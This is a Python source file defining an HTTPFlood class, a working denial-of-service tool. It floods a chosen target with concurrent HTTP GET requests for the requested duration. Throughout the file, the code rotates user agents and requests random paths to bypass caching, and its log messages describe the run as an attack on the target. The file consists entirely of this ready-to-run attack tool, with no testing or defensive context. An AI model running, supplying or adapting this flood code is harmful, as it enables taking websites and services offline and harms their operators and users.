import asyncio
import aiohttp
import random
import time
import threading
from urllib.parse import urljoin, urlparse

class HTTPFlood:
    def __init__(self, target, duration=30, threads=100, port=80, callback=None):
        self.target = target
        self.duration = duration
        self.threads = threads
        self.port = port
        self.callback = callback
        self.stop_event = threading.Event()
        self.stats = {
            "requests_sent": 0,
            "failed_requests": 0,
            "start_time": None,
            "end_time": None
        }
        
        # Ensure proper URL format
        if not self.target.startswith(('http://', 'https://')):
            self.target = f"http://{self.target}"
        
        # User agents for rotation
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
        ]
    
    def log(self, message):
        if self.callback:
            self.callback(message)
        else:
            print(f"[HTTP Flood] {message}")
    
    async def send_request(self, session):
        try:
            headers = {
                "User-Agent": random.choice(self.user_agents),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
            }
            
            # Random path to bypass caching
            path = f"/{random.randint(1000, 999999)}"
            url = f"{self.target}{path}"
            
            async with session.get(url, headers=headers, timeout=5) as response:
                self.stats["requests_sent"] += 1
                return True
        except Exception as e:
            self.stats["failed_requests"] += 1
            return False
    
    async def worker(self, session):
        while not self.stop_event.is_set():
            await self.send_request(session)
            await asyncio.sleep(0.001)  # Small delay to prevent complete CPU saturation
    
    async def progress_reporter(self):
        while not self.stop_event.is_set():
            await asyncio.sleep(0.05)
            if not self.stop_event.is_set():
                self.log(f"Requests sent: {self.stats['requests_sent']} | Failed: {self.stats['failed_requests']}")

    async def run_async(self):
        self.stats["start_time"] = time.time()
        self.log(f"Starting HTTP Flood attack on {self.target}")
        self.log(f"Duration: {self.duration}s | Threads: {self.threads}")

        connector = aiohttp.TCPConnector(limit=self.threads, ssl=False)
        timeout = aiohttp.ClientTimeout(total=5)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = []
            for _ in range(self.threads):
                task = asyncio.create_task(self.worker(session))
                tasks.append(task)

            reporter = asyncio.create_task(self.progress_reporter())

            # Run for specified duration
            await asyncio.sleep(self.duration)
            self.stop_event.set()

            # Cancel remaining tasks
            reporter.cancel()
            for task in tasks:
                task.cancel()

            await asyncio.gather(*tasks, reporter, return_exceptions=True)

        self.stats["end_time"] = time.time()
        self.log(f"Attack completed. Total requests: {self.stats['requests_sent']}")
    
    def run(self):
        asyncio.run(self.run_async())
        return self.stats
    
    def stop(self):
        self.stop_event.set()
        self.log("Stop signal received")